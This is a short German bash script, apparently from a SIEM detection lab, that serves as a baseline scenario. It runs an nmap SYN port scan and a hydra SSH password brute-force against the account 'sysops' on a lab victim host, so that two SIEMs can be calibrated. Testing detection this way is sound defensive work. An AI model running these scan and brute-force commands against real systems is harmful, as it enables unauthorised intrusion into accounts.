#!/usr/bin/env bash
# Szenario 1 - Baseline (Kontrolle)
# Laute, gut signaturisierte Aktivität. Beide SIEMs sollen das
# zuverlässig erkennen. Dieses Szenario kalibriert die Erkennung,
# bevor die subtileren Szenarien 2 und 3 folgen.
#
# Ground-Truth-Events (Zuordnung nach dem Checkpoint eintragen):
#   E?  - Port-Scan auf das victim
#   E?  - SSH-Brute-Force gegen das Konto sysops
#
set -euo pipefail

VICTIM="${VICTIM_IP:-192.168.20.20}"

echo "[*] Szenario 1 - Start: $(date --iso-8601=seconds)"

echo "[*] E?: TCP-Port-Scan auf ${VICTIM}"
nmap -sS -p 1-1024 "${VICTIM}"

echo "[*] E?: SSH-Brute-Force gegen sysops@${VICTIM}"
hydra -l sysops -P /opt/scenarios/passwords.txt \
      -t 4 "ssh://${VICTIM}" || true

echo "[*] Szenario 1 - Ende: $(date --iso-8601=seconds)"
